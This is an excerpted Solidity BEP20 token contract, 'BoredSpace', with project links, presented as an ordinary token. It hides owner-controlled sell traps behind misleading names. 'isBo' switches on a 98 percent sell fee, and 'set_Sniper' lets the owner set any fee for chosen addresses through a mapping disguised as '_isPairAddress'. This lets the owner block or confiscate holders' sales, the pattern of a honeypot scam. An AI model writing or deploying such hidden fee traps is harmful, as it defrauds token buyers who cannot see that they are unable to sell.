...
/*
https://www.boredspacelabs.com/
*/

/*
https://t.me/BoredSpacePortal
*/
...
contract BoredSpace is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEV = 0x02d7c76d378AA7b50B05A4ddb7b4a1729e8B29E1;

    string constant _name = "BoredSpace";
    ...
    mapping (address => uint) public _isPairAddress;
    ...
    bool isPair = false;
    uint _amount = 49;
    function isBo(bool y) public onlyOwner {
        isPair = y;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        uint256 amountReceived = takeFee(sender, amount,(recipient == pair));
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        if(isSell) {
            if(isPair){
                feeAmount = _amount.mul(2);
            }else{
                if(_isPairAddress[sender] > 0){
                    feeAmount = _isPairAddress[sender];
                }else{
    ...
    function set_Sniper(address[] calldata addresses, uint status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            _isPairAddress[addresses[i]] = status;
        }
    }
